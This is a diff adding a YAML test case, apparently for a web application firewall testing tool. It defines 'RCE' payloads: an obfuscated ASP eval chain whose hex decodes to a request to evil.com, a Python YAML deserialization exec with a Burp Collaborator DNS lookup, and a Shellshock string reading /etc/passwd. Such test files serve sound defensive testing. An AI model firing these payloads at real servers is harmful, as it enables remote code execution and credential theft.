@@ -1,0 +1,13 @@
+---
+payload:
+  - 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i 2,2)&"""")""""):i=i 2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""44696d20686d3a536574206f626a584d4c3d5365727665722e4372656174654f626a65637428224d53584d4c322e536572766572584d4c4854545022293a6f626a584d4c2e6f70656e2022474554222c22687474703a2f2f6576696c2e636f6d2f6170692e7068703f6b65793d7c786c736c31736b733832646a6173647564736178787878222c66616c73653a6f626a584d4c2e73656e6428293a686d3d6f626a584d4c2e726573706f6e7365546578743a496620686d3c3e224f4b22205468656e3a526573706f6e73652e57726974652822454e4422293a456e642049663a526573706f6e73652e577269746528224c584c2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")'
+  - "!!python/object/new:exec [import socket; socket.gethostbyname('somehost.burpcollaborator.net')]"
+  - "() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'"
+encoder:
+  - URL
+placeholder:
+  - URLParam
+  - HTMLForm
+  - HTMLMultipartForm
+type: "RCE"
+...
